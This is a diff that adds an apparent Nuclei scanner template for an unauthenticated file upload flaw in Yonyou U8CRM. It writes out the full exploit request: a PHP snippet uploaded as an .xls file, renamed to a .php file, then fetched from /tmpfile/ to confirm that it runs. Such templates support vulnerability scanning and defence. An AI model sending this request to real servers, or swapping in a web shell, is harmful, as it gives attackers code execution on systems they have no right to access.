@@ -1,0 +1,46 @@
+id: yonyou-u8crm-file_upload-CT-1378528
+info:
+  name: Yonyou U8CRM File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects a file upload vulnerability in the Yonyou U8CRM application.
+
+variables:
+  random_int: "{{rand_int(10000, 99999)}}"
+  random_string: "{{rand_text_alpha(8)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/crmtools/tools/import.php?DontCheckLogin=1&issubmit=1"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundarye0z8QbHs79gL8vW5"
+    body: |
+      ------WebKitFormBoundarye0z8QbHs79gL8vW5
+      Content-Disposition: form-data; name="xfile"; filename="{{random_int}}.xls"
+
+      <?php echo md5("{{random_int}}"); unlink(__FILE__); ?>
+      ------WebKitFormBoundarye0z8QbHs79gL8vW5
+      Content-Disposition: form-data; name="combo"
+
+      {{random_string}}.php
+      ------WebKitFormBoundarye0z8QbHs79gL8vW5--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"success":'
+    matchers-condition: and
+
+  - id: verify-file
+    method: GET
+    path:
+      - "{{BaseURL}}/tmpfile/{{random_string}}.php"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{md5(random_int)}}"
+    matchers-condition: and
